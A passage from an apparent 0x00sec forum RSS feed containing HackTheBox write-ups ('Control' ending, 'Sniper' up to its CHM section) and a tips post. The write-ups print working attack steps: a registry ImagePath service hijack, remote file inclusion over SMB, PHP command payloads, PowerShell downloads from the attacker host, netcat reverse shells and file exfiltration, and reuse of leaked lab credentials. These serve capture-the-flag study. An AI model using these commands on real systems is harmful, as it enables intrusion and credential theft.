    RequiredPrivileges    REG_MULTI_SZ    SeTcbPrivilege\0SeSecurityPrivilege\0SeAssignPrimaryTokenPrivilege\0SeTakeOwnershipPrivilege\0SeLoadDriverPrivilege\0SeBackupPrivilege\0SeRestorePrivilege\0SeImpersonatePrivilege\0SeAuditPrivilege\0SeChangeNotifyPrivilege\0SeUndockPrivilege\0SeDebugPrivilege\0SeShutdownPrivilege
    ServiceSidType    REG_DWORD    0x1
    Start    REG_DWORD    0x3
    Type    REG_DWORD    0x20

HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlset\Services\DeviceInstall\Parameters
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlset\Services\DeviceInstall\TriggerInfo
PS C:\Users\Hector\Documents&gt;
</code></pre>
<p>Out of all those keys, the one we are interested in is ImagePath. The ImagePath key tells Windows what command to execute when a service needs to be started. If we could change the ImagePath value of one of these services thanks to the permissions seen above and then start that service we would be able to execute arbitrary code as the local SYSTEM account.</p>
<p>Unfortunately, just because a registry ACL includes full control to Hector, it doesn’t mean we will be able to start that service. Hector is not a member of the Administrators group and so cannot arbitrarily shut down or restart services, we’re going to have to do some more trial and error to find some services we can control and which are also not running and we can start ourselves.</p>
<hr>
<h2>Privilege Escalation: Windows Service Hijack</h2>
<p>(improvised term)</p>
<p>The <a href="https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.management/get-service?view=powershell-7" rel="nofollow noopener">Get-Service</a> cmdlet comes to our aid, by using it to query a service we can tell whether that service is running or not:</p>
<pre><code class="lang-nohighlight">PS C:\Users\Hector\Documents&gt; get-service NetTcpPortSharing | fl
get-service NetTcpPortSharing | fl


Name                : NetTcpPortSharing
DisplayName         : Net.Tcp Port Sharing Service
Status              : Stopped
DependentServices   : {}
ServicesDependedOn  : {}
CanPauseAndContinue : False
CanShutdown         : False
CanStop             : False
ServiceType         : Win32ShareProcess
</code></pre>
<p>So services that can be queried with Get-Service and appear not to be running make for potential targets. Once again because Hector has limited permissions over services, only a portion of them can be queried with the cmdlet and this allows us to narrow down the number of targets to enumerate.</p>
<p>With some string manipulation we can turn the output file given to us earlier by the reg query command into a .ps1 script like this:</p>
<pre><code class="lang-nohighlight">Get-Service -Name ".NET CLR Data"
Get-Service -Name ".NET CLR Networking"
Get-Service -Name ".NET CLR Networking 4.0.0.0"
Get-Service -Name ".NET Data Provider for Oracle"
Get-Service -Name ".NET Data Provider for SqlServer"
Get-Service -Name ".NET Memory Cache 4.0"
Get-Service -Name ".NETFramework"
Get-Service -Name "1394ohci"
Get-Service -Name "3ware"
Get-Service -Name "ACPI"
Get-Service -Name "AcpiDev"
Get-Service -Name "acpiex"
Get-Service -Name "acpipagr"
Get-Service -Name "AcpiPmi"
Get-Service -Name "acpitime"
Get-Service -Name "ADOVMPPackage"
Get-Service -Name "ADP80XX"
Get-Service -Name "adsi"
Get-Service -Name "ADWS"
Get-Service -Name "AFD"
Get-Service -Name "afunix"
Get-Service -Name "ahcache"
Get-Service -Name "AJRouter"
Get-Service -Name "ALG"
Get-Service -Name "AmdK8"
Get-Service -Name "AmdPPM"
[....]
</code></pre>
<p>Download, execute, redirect output to a file and the result will be something like the following:</p>
<pre><code class="lang-nohighlight">Status   Name               DisplayName                           
------   ----               -----------                           
Stopped  applockerfltr      Smartlocker Filter Driver             
Stopped  AppMgmt            Application Management                
Stopped  AppVClient         Microsoft App-V Client                
Running  BFE                Base Filtering Engine                 
Running  BrokerInfrastru... Background Tasks Infrastructure Ser...
Running  CLFS               Common Log (CLFS)                     
Running  ClipSVC            Client License Service (ClipSVC)      
Stopped  ConsentUxUserSvc   ConsentUX                             
Running  DcomLaunch         DCOM Server Process Launcher          
Stopped  DevicePickerUse... DevicePicker                          
Stopped  DevicesFlowUserSvc DevicesFlow                           
Running  Dhcp               DHCP Client                           
Stopped  dmwappushservice   Device Management Wireless Applicat...
Running  Dnscache           DNS Client                            
Stopped  DoSvc              Delivery Optimization                 
Running  DsSvc              Data Sharing Service                  
Stopped  EFS                Encrypting File System (EFS)          
Running  EventLog           Windows Event Log                     
Stopped  icssvc             Windows Mobile Hotspot Service        
Stopped  KtmRm              KtmRm for Distributed Transaction C...
Running  LSM                Local Session Manager                 
Stopped  MapsBroker         Downloaded Maps Manager               
Running  mpsdrv             Windows Defender Firewall Authoriza...
Running  mpssvc             Windows Defender Firewall             
Running  MSDTC              Distributed Transaction Coordinator   
Running  NetBT              NetBT                                 
Stopped  NetSetupSvc        Network Setup Service                 
Stopped  NetTcpPortSharing  Net.Tcp Port Sharing Service          
Stopped  NgcCtnrSvc         Microsoft Passport Container          
Stopped  NgcSvc             Microsoft Passport                    
Stopped  PhoneSvc           Phone Service                         
Stopped  PimIndexMainten... Contact Data                          
Stopped  pla                Performance Logs &amp; Alerts             
Stopped  PrintWorkflowUs... PrintWorkflow                         
Stopped  RasAcd             Remote Access Auto Connection Driver  
Stopped  RasAuto            Remote Access Auto Connection Manager 
Running  RasMan             Remote Access Connection Manager      
Stopped  RemoteAccess       Routing and Remote Access             
Stopped  RmSvc              Radio Management Service              
Running  RpcEptMapper       RPC Endpoint Mapper                   
Running  RpcSs              Remote Procedure Call (RPC)           
Stopped  RSoPProv           Resultant Set of Policy Provider      
Running  SamSs              Security Accounts Manager             
Running  Schedule           Task Scheduler                        
Stopped  seclogon           Secondary Logon                       
Stopped  SecurityHealthS... Windows Security Service              
Stopped  SEMgrSvc           Payments and NFC/SE Manager           
Running  SENS               System Event Notification Service     
Stopped  SensorService      Sensor Service                        
Stopped  SensrSvc           Sensor Monitoring Service             
Stopped  smphost            Microsoft Storage Spaces SMP          
Running  Spooler            Print Spooler                         
Stopped  sppsvc             Software Protection                   
Running  SstpSvc            Secure Socket Tunneling Protocol Se...
Running  SystemEventsBroker System Events Broker                  
Running  TimeBrokerSvc      Time Broker                           
Stopped  UevAgentService    User Experience Virtualization Service
Stopped  UnistoreSvc        User Data Storage                     
Stopped  UserDataSvc        User Data Access                      
Stopped  UsoSvc             Update Orchestrator Service           
Stopped  vds                Virtual Disk                          
Stopped  WaaSMedicSvc       Windows Update Medic Service          
Stopped  WdBoot             Windows Defender Antivirus Boot Driver
Running  WdFilter           Windows Defender Antivirus Mini-Fil...
Running  WdNisDrv           Windows Defender Antivirus Network ...
Running  WdNisSvc           Windows Defender Antivirus Network ...
Running  WinDefend          Windows Defender Antivirus Service    
Running  WinHttpAutoProx... WinHTTP Web Proxy Auto-Discovery Se...
Stopped  WpnUserService     Windows Push Notifications User Ser...
Stopped  wuauserv           Windows Update  
</code></pre>
<p>Let’s see if we can start any of these stopped services. Most of them will give an error like this:</p>
<pre><code class="lang-nohighlight">PS C:\temp&gt; start-service ktmrm
start-service ktmrm
start-service : Service 'KtmRm for Distributed Transaction Coordinator (ktmrm)' cannot be started due to the following 
error: Cannot open ktmrm service on computer '.'.
At line:1 char:1
+ start-service ktmrm
+ ~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : OpenError: (System.ServiceProcess.ServiceController:ServiceController) [Start-Service],  
   ServiceCommandException
    + FullyQualifiedErrorId : CouldNotStartService,Microsoft.PowerShell.Commands.StartServiceCommand
</code></pre>
<p>But a few will not act so whiny, for example:</p>
<pre><code class="lang-nohighlight">PS C:\temp&gt; start-service pla
start-service pla
PS C:\temp&gt; get-service pla | fl
get-service pla | fl


Name                : pla
DisplayName         : Performance Logs &amp; Alerts
Status              : Running
DependentServices   : 
ServicesDependedOn  : {RPCSS}
CanPauseAndContinue : False
CanShutdown         : True
CanStop             : True
ServiceType         : Win32ShareProcess
</code></pre>
<p>That means the service is attackable because we can tell Windows to start it after overwriting the original registry value with our payload, which could simply be an nc.exe reverse shell, in that case <a href="https://ss64.com/nt/reg.html" rel="nofollow noopener"><em>reg add</em></a> is used to change a service’s ImagePath key like this:</p>
<pre><code class="lang-nohighlight">reg add HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlset\Services\netsetupsvc /v ImagePath /D "C:\Users\Hector\Documents\nc.exe -e cmd.exe 10.10.15.203 7777"
</code></pre>
<p>Run Start-Service after the write operation and the payload will be executed:</p>
<p><span alt="immagine" data-base62-sha1="mHkX7bifArd4FDvXXCLb33Yyogj" class="broken-image" title="This image is broken"><svg class="fa d-icon d-icon-unlink svg-icon" aria-hidden="true"><use xlink:href="#unlink"></use></svg></span></p>
<p>This concludes the writeup for Control, I hope it was exhaustive, interesting, and comprehensible all at the same time.</p>
<p>Stay safe.</p>
            <p><small>3 posts - 2 participants</small></p>
            <p><a href="https://0x00sec.org/t/hackthebox-writeup-control/20801">Read full topic</a></p>
          ]]></description>
          <link>https://0x00sec.org/t/hackthebox-writeup-control/20801</link>
          <pubDate>Sat, 25 Apr 2020 15:08:42 +0000</pubDate>
          <discourse:topicPinned>No</discourse:topicPinned>
          <discourse:topicClosed>Yes</discourse:topicClosed>
          <discourse:topicArchived>No</discourse:topicArchived>
          <guid isPermaLink="false">0x00sec.org-topic-20801</guid>
          <source url="https://0x00sec.org/t/hackthebox-writeup-control/20801.rss">HackTheBox Writeup: Control</source>
        </item>
        <item>
          <title>Useful things I tend to forget to do when playing HTB</title>
          <dc:creator><![CDATA[vict0ni]]></dc:creator>
          <category>Hackthebox Writeups</category>
          <description><![CDATA[
            <p>HTB is a great place for anyone to practice their hacking skills. It doesn’t matter if you’re a beginner or a seasoned security professional, it has all sorts of machines to challenge your skills. After spending many hours, trying to root as many boxes as possible, I observed that I tend to forget some good practices or certain techniques and commands that would make my life easier and I thought of making this little article.</p>
<h2>OSINT</h2>
<p>With that, I mean the general concept of OSINT and looking for clues and solutions.</p>
<ul>
<li>It’s always important to <strong>note any user you come across</strong> while browsing a website, as it may be useful for later use. A user <code>Carl Smith</code> that wrote an article on that box may have an account with the username <code>csmith</code> or <code>c.smith</code> or <code>cSmith</code> etc. If you come across a password with no username, chances are Mr. Smith is your guy.</li>
<li>
<strong>Do some research on the box’s creator.</strong> This may sound as a cheat, <strong>but</strong>(!) see it this way: when you’re doing a pentest and you want to do a spear phishing attack, you have to know your target, right?<br>
Many creators get in the process of creating a box just because they have an article about a technique to escalate privileges or a CVE under their name. Search for their blogs, their Github profiles and maybe even Twitter(?)!</li>
</ul>
<h2>Read <code>.bash_history</code>
</h2>
<p>Probably 99% of the boxes have it like that: <code>.bash_history &gt; /dev/null</code>. Nevertheless, once you’re in the box, it only takes you half of a second to check. In real-world environments <code>.bash_history</code> can contain juicy information, like <em>“accidental passwords typed after unsuccessful sudo”</em> as mentioned this <a href="https://0x00sec.org/t/the-ultimate-privilege-escalation-reference-wiki/9788">privilege escalation reference guide - Wiki</a> in 0x00sec. Although I get it why <code>.bash_history</code> gets redirected to <code>dev/null/</code> here in HTB. If it wasn’t, I would be getting root just by waiting for someone to enter the commands for me!</p>
<h2>$ <code>sudo -l</code>
</h2>
<p>I really don’t know why, I just forget it. But you shouldn’t!</p>
<h2>Enum, enum, enum</h2>
<p>I can’t stress that enough. <strong>Enumerate as if you’re about to get root.</strong><br>
Yeah, sometimes things are clear as daylight, e.g. having a machine that uses a web server that is vulnerable  to RCE. But most of the times it’s not and HTB wants you to suffer.</p>
<h2>Frustration is your enemy</h2>
<p>This can be a note to myself for every time I get stuck in a box. No, vict0ni, the box doesn’t want to mess with you. Neither does the creator. <strong>Take a step back, review your findings and the situation, and try again.</strong> This, of course, is not limited for playing HTB but it’s a good general tip for hacking and coding.</p>
<h2>Don’t avoid Windows boxes</h2>
<p><strong>You can’t avoid the inevitable.</strong> Windows were, are and will be a big part of the world of computers. Although it’s boxes doesn’t always have the most realistic environments, I tend to see HTB as a practice for the real world and a very good preparation for OSCP. As I lack of knowledge for Windows, I can only get better at it by practicing. As <a class="mention" href="https://0x00sec.org/u/pry0cc">@pry0cc</a> said:</p>
<blockquote>
<p>Eat your vegetables!</p>
</blockquote>
<p>(If you’re like <a class="mention" href="https://0x00sec.org/u/baud">@Baud</a>, replace the word “Windows” with “Linux”)</p>
<h3>Now go hack!</h3>
<p><br>
<br>
<img src="http://www.hackthebox.eu/badge/image/87180" alt="vict0ni" width="220" height="50"></p>
            <p><small>14 posts - 7 participants</small></p>
            <p><a href="https://0x00sec.org/t/useful-things-i-tend-to-forget-to-do-when-playing-htb/20784">Read full topic</a></p>
          ]]></description>
          <link>https://0x00sec.org/t/useful-things-i-tend-to-forget-to-do-when-playing-htb/20784</link>
          <pubDate>Fri, 24 Apr 2020 21:13:17 +0000</pubDate>
          <discourse:topicPinned>No</discourse:topicPinned>
          <discourse:topicClosed>Yes</discourse:topicClosed>
          <discourse:topicArchived>No</discourse:topicArchived>
          <guid isPermaLink="false">0x00sec.org-topic-20784</guid>
          <source url="https://0x00sec.org/t/useful-things-i-tend-to-forget-to-do-when-playing-htb/20784.rss">Useful things I tend to forget to do when playing HTB</source>
        </item>
        <item>
          <title>HackTheBox Writeup: Sniper</title>
          <dc:creator><![CDATA[Baud]]></dc:creator>
          <category>Hackthebox Writeups</category>
          <description><![CDATA[
            <p><span alt="image" data-base62-sha1="dGgVB0JxiSOHnJDpX8EKmuHG6ZV" class="broken-image" title="This image is broken"><svg class="fa d-icon d-icon-unlink svg-icon" aria-hidden="true"><use xlink:href="#unlink"></use></svg></span></p>
<p>I haven’t posted one of my writeups here in a while so I thought I would make one for an interesting box that just got retired: Sniper.</p>
<p>I really liked this box because it went places that I haven’t seen other boxes exploring, like RFI with a twist and creating a malicious CHM documentation file to escalate privileges, all things worth learning.</p>
<hr>
<h2>Enumeration</h2>
<p>An nmap scan probing all ports for services and running all default NSE scripts only returns a few results, RPC, SMB, and HTTP:</p>
<pre><code class="lang-auto">┌─[baud@parrot]─[~/HTB/sniper]
└──╼ $sudo nmap -sV -sC -p- -oA fullScan -T4 10.10.10.151
[sudo] password for baud: 
Starting Nmap 7.80 ( https://nmap.org ) at 2020-02-26 02:20 CET
Nmap scan report for 10.10.10.151
Host is up (0.041s latency).
Not shown: 65530 filtered ports
PORT      STATE SERVICE       VERSION
80/tcp    open  http          Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Sniper Co.
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
49667/tcp open  msrpc         Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 8h01m53s
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2020-02-26T09:25:03
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 184.42 seconds
</code></pre>
<p>SMB NULL sessions are not allowed so not much enumeration is possible with tools like enum4linux:</p>
<pre><code class="lang-auto">┌─[✗]─[baud@parrot]─[~/HTB/sniper]
└──╼ $enum4linux 10.10.10.151 2&gt;/dev/null
Starting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Wed Feb 26 02:40:55 2020

 ========================== 
|    Target Information    |
 ========================== 
Target ........... 10.10.10.151
RID Range ........ 500-550,1000-1050
Username ......... ''
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none


 ==================================================== 
|    Enumerating Workgroup/Domain on 10.10.10.151    |
 ==================================================== 
[E] Can't find workgroup/domain


 ============================================ 
|    Nbtstat Information for 10.10.10.151    |
 ============================================ 
Looking up status of 10.10.10.151
No reply from 10.10.10.151

 ===================================== 
|    Session Check on 10.10.10.151    |
 ===================================== 
[E] Server doesn't allow session using username '', password ''.  Aborting remainder of tests.
</code></pre>
<p>The homepage of the web server does not contain anything useful other than a bunch of links to other pages:</p>
<p><span alt="image" data-base62-sha1="vgZU1Ko9CMAIFZRskv2SSlpgLP6" class="broken-image" title="This image is broken"><svg class="fa d-icon d-icon-unlink svg-icon" aria-hidden="true"><use xlink:href="#unlink"></use></svg></span></p>
<p>One of the pages is a blog with a few placeholder posts in it and two dropdown menus:</p>
<p><span alt="image" data-base62-sha1="9hN4tnG1MGCLb7k7AVxD2m7ogAY" class="broken-image" title="This image is broken"><svg class="fa d-icon d-icon-unlink svg-icon" aria-hidden="true"><use xlink:href="#unlink"></use></svg></span></p>
<p>There’s also a simple login portal:</p>
<p><span alt="image" data-base62-sha1="1fp1dJowNEDd75ALrXguL722Hda" class="broken-image" title="This image is broken"><svg class="fa d-icon d-icon-unlink svg-icon" aria-hidden="true"><use xlink:href="#unlink"></use></svg></span></p>
<p>The portal allows to create an account via the registration.php page:</p>
<p><span alt="image" data-base62-sha1="d0M9mQ1ZZrbSY0lWJ2tNSDAWleh" class="broken-image" title="This image is broken"><svg class="fa d-icon d-icon-unlink svg-icon" aria-hidden="true"><use xlink:href="#unlink"></use></svg></span></p>
<p>Registering a new account and using it to login takes to an under construction page from where the only option is to log out:</p>
<p><span alt="image" data-base62-sha1="y1ISn1ALm2xlS3p09Av45yG8XrL" class="broken-image" title="This image is broken"><svg class="fa d-icon d-icon-unlink svg-icon" aria-hidden="true"><use xlink:href="#unlink"></use></svg></span></p>
<p>Back to the blog, the drop-down Language menu has a few links, each of which redirects to the same blog page but passing it an argument containing the name of a PHP page:</p>
<pre><code class="lang-auto">http://10.10.10.151/blog/?lang=blog-en.php
</code></pre>
<p>Trivial LFI payloads on the parameter don’t seem to work, these are the ones I’ve tried myself:</p>
<pre><code class="lang-auto">http://10.10.10.151/blog/index.php --&gt; loads properly
http://10.10.10.151/blog/?lang=blog-en.php --&gt; loads properly
http://10.10.10.151/blog/blog-es.php --&gt; loads properly
http://10.10.10.151/blog/?lang=././blog-en.php --&gt; loads properly
http://10.10.10.151/blog/?lang=../index.php --&gt; not found
http://10.10.10.151/blog/?lang=..../index.php --&gt; not found
http://10.10.10.151/blog/?lang=.../index.php --&gt; not found
http://10.10.10.151/blog/?lang=../blog/blog-en.php --&gt; not found
http://10.10.10.151/blog/?lang=../../../../../index.php --&gt; not found
%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2findex.php --&gt; ..%2f..%2f..%2f..%2f..%2findex.php
</code></pre>
<hr>
<h2>Exploitation: RFI via SMB</h2>
<p>At this point I tried RFI as well, which is pretty rare but it never hurts to try. It turns out that the web application will not include any page that is passed to it via HTTP, but it will access pages located in shared folders via SMB:</p>
<pre><code class="lang-auto">http://10.10.10.151/blog/?lang=\\10.10.14.144\sniper\hello.php
</code></pre>
<p>We can set up a Samba share to welcome the connection and serve a PHP page to the web application by adding an entry to /usr/share/samba/smb.conf fpr a dedicated share:</p>
<pre><code class="lang-auto">[sniper]
path = /home/baud/HTB/sniper   
writable = no
guest ok = yes
guest only = yes
read only = yes
directory mode = 0555
force user = nobody
</code></pre>
<p>Restart the smbd service:</p>
<pre><code class="lang-auto">baud@kali:~$ sudo service smbd restart
</code></pre>
<p>Verify that the share now exists:</p>
<pre><code class="lang-auto">baud@kali:~$ smbclient -N -L localhost

	Sharename       Type      Comment
	---------       ----      -------
	sniper          Disk      
	IPC$            IPC       IPC Service (Heyo)
SMB1 disabled -- no workgroup available
</code></pre>
<p>Put any PHP file of your choice in there and import it through the URL:</p>
<p><span alt="image" data-base62-sha1="koTlQlixZdyZY7EwyerDOTgs1AV" class="broken-image" title="This image is broken"><svg class="fa d-icon d-icon-unlink svg-icon" aria-hidden="true"><use xlink:href="#unlink"></use></svg></span></p>
<p>Now we can execute any PHP code in the context of the vulnerable web application, for example we can demonstrare RCE with a simple “whoami”:</p>
<pre><code class="lang-php">&lt;?php
        echo "&lt;pre&gt;";
        system('whoami');
        echo "&lt;/pre&gt;";
        die;
?&gt;
</code></pre>
<p>Which returns in the page:</p>
<p><span alt="image" data-base62-sha1="6iy6KGansyECgy3BAypjHEtmGDh" class="broken-image" title="This image is broken"><svg class="fa d-icon d-icon-unlink svg-icon" aria-hidden="true"><use xlink:href="#unlink"></use></svg></span></p>
<p>We could keep doing this manually for each command, for example here’s how to download files on the host:</p>
<pre><code class="lang-php">&lt;?php
	$commands = "powershell -Command \"IWR http://10.10.14.144/nc.exe -OutFile ./nc.exe\"";
        echo "&lt;pre&gt;";
        system($commands);
        echo "&lt;/pre&gt;";
        die;
?&gt;
</code></pre>
<p>Although nc.exe is flagged as malicious and deleted by Defender. A Nishang reverse shell with download cradle does not work either, and it is easy to tell why with this payload:</p>
<pre><code class="lang-php">&lt;?php
	$commands = "powershell -Command \"\$ExecutionContext.SessionState.LanguageMode\"";
        echo "&lt;pre&gt;";
        system($commands);
        echo "&lt;/pre&gt;";
        die;
?&gt;
</code></pre>
<p>The result is:</p>
<p><span alt="image" data-base62-sha1="nOKRqlueZMo77LdF062ahc7ME15" class="broken-image" title="This image is broken"><svg class="fa d-icon d-icon-unlink svg-icon" aria-hidden="true"><use xlink:href="#unlink"></use></svg></span></p>
<p>So PowerShell’s constrained language is also enabled, limiting the actions we can perform with it.</p>
<p>After getting tired of changing the payload manually every time I found a <a href="https://raw.githubusercontent.com/artyuum/Simple-PHP-Web-Shell/master/index.php" rel="nofollow noopener">web shell</a> that works out of the box without being destroyed by Defender:</p>
<p><span alt="image" data-base62-sha1="7KpCAElXJxmbmav44OlfuOVhkrq" class="broken-image" title="This image is broken"><svg class="fa d-icon d-icon-unlink svg-icon" aria-hidden="true"><use xlink:href="#unlink"></use></svg></span></p>
<p>From here shell commands have to be escaped slightly, for example:</p>
<p><span alt="image" data-base62-sha1="pNcPviEX4XgJfqLLrMYlLbTr4Uh" class="broken-image" title="This image is broken"><svg class="fa d-icon d-icon-unlink svg-icon" aria-hidden="true"><use xlink:href="#unlink"></use></svg></span></p>
<hr>
<h2>Privilege Escalation <span class="hashtag">#1:</span> Passwsord Reuse + PSSession</h2>
<p>The user folder has an old version of the registration page but the most interesting part is the db.php file in the same directory, which has the database credentials in it:</p>
<pre><code class="lang-php">&lt;?php
// Enter your Host, username, password, database below.
// I left password empty because i do not set password on localhost.
$con = mysqli_connect("localhost","dbuser","36mEAhz/B8xQ~2VM","sniper");
// Check connection
if (mysqli_connect_errno())
  {
  echo "Failed to connect to MySQL: " . mysqli_connect_error();
  }
?&gt;
</code></pre>
<p>At first I didn’t mind it too much and started enumerating MySQL by creating PHP pages to query it for all its databases and tables but with no great results (the only thing I found was an MD5 hash for a “superuser” user which I could not crack).</p>
<p>After a little break and some thinking I forgot to check for one of the weaknesses I so often underestimate: password reuse. I found out the database password is basically Chris’ account password, I verified this with smbclient by being able to list the shares with his account:</p>
<pre><code class="lang-auto">baud@kali:~/HTB/sniper$ smbclient -U chris -L \\\\10.10.10.151
Enter WORKGROUP\chris's password: 

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
SMB1 disabled -- no workgroup available
</code></pre>
<p>As established at the beginning, anonymous users are not allowed to list shares on the box, meaning the credentials are correct:</p>
<pre><code class="lang-auto">User: chris
Pass: 36mEAhz/B8xQ~2VM
</code></pre>
<p>Still, Chris can’t access the C$ share anyway:</p>
<pre><code class="lang-auto">baud@kali:~/HTB/sniper$ smbclient -U chris \\\\10.10.10.151\\C$
Enter WORKGROUP\chris's password: 
tree connect failed: NT_STATUS_ACCESS_DENIED
</code></pre>
<p>With a set of working credentials and nowhere to use them I was forced to drop files on the box. My first try was with the nc-family of binaries, using this command:</p>
<pre><code class="lang-auto">powershell -command iwr http://10.10.14.144/ncat.exe -outfile \"c:\users\all users\data\ncat.exe\""
</code></pre>
<p>But Defender is always ready to stop the fun by flagging the binaries. Here’s what I tried downloading and what worked:</p>
<pre><code class="lang-auto">nc --&gt; flagged
ncat --&gt; flagged
nc64 --&gt; works!
</code></pre>
<p>After downloading nc64 on the box I can call it from the web shell to contact my own host with a reverse shell:</p>
<pre><code class="lang-auto">"c:\users\all users\data\nc64.exe" -e cmd.exe 10.10.14.144 9999
</code></pre>
<p>And my listener receives a connection giving me a proper shell at last:</p>
<pre><code class="lang-auto">baud@kali:~/HTB/sniper$ nc -lvnp 9999
listening on [any] 9999 ...
connect to [10.10.14.144] from (UNKNOWN) [10.10.10.151] 49737
Microsoft Windows [Version 10.0.17763.678]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\inetpub\wwwroot\blog&gt;
</code></pre>
<p>We can become Chris by starting a PSSession with his credentials, since PSSessions aren’t blocked by the CLM. First we enter the PowerShell console:</p>
<pre><code class="lang-auto">C:\inetpub\wwwroot\blog&gt;powershell
powershell
Windows PowerShell 
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\inetpub\wwwroot\blog&gt;
</code></pre>
<p>Then we put the user’s password in a variable as a SecureString:</p>
<pre><code class="lang-auto">PS C:\inetpub\wwwroot\blog&gt; $pw = ConvertTo-SecureString -String "36mEAhz/B8xQ~2VM" -AsPlainText -force
</code></pre>
<p>The password is used to create a PSCredential object together with the username:</p>
<pre><code class="lang-auto">PS C:\inetpub\wwwroot\blog&gt; $pp = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList ".\chris", $pw
</code></pre>
<p>Now the Enter-PSSession cmdlet can be used to start a PSSession using that PSCredential object, which makes us impersonate Chris:</p>
<pre><code class="lang-auto">PS C:\inetpub\wwwroot\blog&gt; Enter-PSSession -ComputerName localhost -Credential $pp
[localhost]: PS C:\Users\Chris\Documents&gt;
</code></pre>
<p>I downloaded nc64.exe again to get a proper reverse shell instead of the uncomfortable PSSession:</p>
<pre><code class="lang-auto">[localhost]: PS C:\Users\Chris\Documents&gt; Invoke-Command -ScriptBlock { IWR http://10.10.14.144/nc64.exe -outfile C:\Users\Chris\Documents\nc64.exe }
[localhost]: PS C:\Users\Chris\Documents&gt; Invoke-Command -ScriptBlock { C:\Users\Chris\Documents\nc64.exe -e cmd.exe 10.10.14.144 9090 }
</code></pre>
<p>I could have easily used the already downloaded nc64 but for some reason I was having issues navigating folders inside the PSSession so it was more comfortable to have another nc64 in the . directory. The new incoming connection is caught and we have a shell as Chris:</p>
<pre><code class="lang-auto">baud@kali:~/HTB/sniper$ nc -lvnp 9090
listening on [any] 9090 ...
connect to [10.10.14.144] from (UNKNOWN) [10.10.10.151] 49779
Microsoft Windows [Version 10.0.17763.678]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Users\Chris\Documents&gt;dir /a
dir /a
 Volume in drive C has no label.
 Volume Serial Number is 6A2B-2640

 Directory of C:\Users\Chris\Documents

02/28/2020  02:53 PM    &lt;DIR&gt;          .
02/28/2020  02:53 PM    &lt;DIR&gt;          ..
04/11/2019  06:04 AM               402 desktop.ini
04/11/2019  06:04 AM    &lt;JUNCTION&gt;     My Music [C:\Users\Chris\Music]
04/11/2019  06:04 AM    &lt;JUNCTION&gt;     My Pictures [C:\Users\Chris\Pictures]
04/11/2019  06:04 AM    &lt;JUNCTION&gt;     My Videos [C:\Users\Chris\Videos]
02/28/2020  02:53 PM            45,272 nc64.exe
               2 File(s)         45,674 bytes
               5 Dir(s)  17,932,124,160 bytes free

C:\Users\Chris\Documents&gt;
</code></pre>
<p>While the user flag is in Chris’ desktop, his downloads folder contains an interesting instructions.chm file:</p>
<pre><code class="lang-auto">C:\Users\Chris&gt;dir /a downloads
dir /a downloads
 Volume in drive C has no label.
 Volume Serial Number is 6A2B-2640

 Directory of C:\Users\Chris\downloads

04/11/2019  07:36 AM    &lt;DIR&gt;          .
04/11/2019  07:36 AM    &lt;DIR&gt;          ..
04/11/2019  06:04 AM               282 desktop.ini
04/11/2019  07:36 AM            10,462 instructions.chm
               2 File(s)         10,744 bytes
               2 Dir(s)  17,932,124,160 bytes free

C:\Users\Chris&gt;
</code></pre>
<p>CHM files are typically shipped witht a program, containing its official documentation. The file can be transfered to us for analysis via nc64:</p>
<pre><code class="lang-auto">C:\Users\Chris\Downloads&gt;..\Documents\nc64.exe -w 3 10.10.14.144 9191 &lt; instructions.chm
</code></pre>
<p>And saved locally like this:</p>
<pre><code class="lang-auto">baud@kali:~/HTB/sniper$ nc -lvnp 9191 &gt; instructions.chm
listening on [any] 9191 ...
connect to [10.10.14.144] from (UNKNOWN) [10.10.10.151] 49810
baud@kali:~/HTB/sniper$ file instructions.chm 
instructions.chm: MS Windows HtmlHelp Data
</code></pre>
<p>This is what the file looks like:</p>
<p><span alt="image" data-base62-sha1="ecvYYcKzoO9VWnj0wFmoSEWBTuO" class="broken-image" title="This image is broken"><svg class="fa d-icon d-icon-unlink svg-icon" aria-hidden="true"><use xlink:href="#unlink"></use></svg></span></p>
<p>This shitty work Chris is talking about is mentioned in the note.txt file in C:\Docs, where we get to appreciate the relationship between this evil CEO and poor coder Chris:</p>
<pre><code class="lang-auto">C:\Users\Chris\Downloads&gt;dir /a c:\docs
dir /a c:\docs
 Volume in drive C has no label.
 Volume Serial Number is 6A2B-2640

 Directory of c:\docs

10/01/2019  12:04 PM    &lt;DIR&gt;          .
10/01/2019  12:04 PM    &lt;DIR&gt;          ..
04/11/2019  08:31 AM               285 note.txt
04/11/2019  08:17 AM           552,607 php for dummies-trial.pdf
               2 File(s)        552,892 bytes
               2 Dir(s)  17,930,002,432 bytes free

C:\Users\Chris\Downloads&gt;more c:\docs\note.txt
more c:\docs\note.txt
Hi Chris,
        Your php skillz suck. Contact yamitenshi so that he teaches you how to use it and after that fix the website as there are a lot of bugs on it. And I hope that you've prepared the documentation for our new app. Drop it here when you're done with it.

Regards,
Sniper CEO.

C:\Users\Chris\Downloads&gt;
</code></pre>
<p>I absolutely love the “PHP for dummies” pdf in the directory just to tease him further on his bad PHP skills. Anyway he mentions dropping the documentation in the Docs folder, probably in CHM format because the file from earlier was supposed to be the Android app documentation.</p>
<hr>
<h2>Privilege Escalation <span class="hashtag">#2:</span> RCE With CHM File</h2>
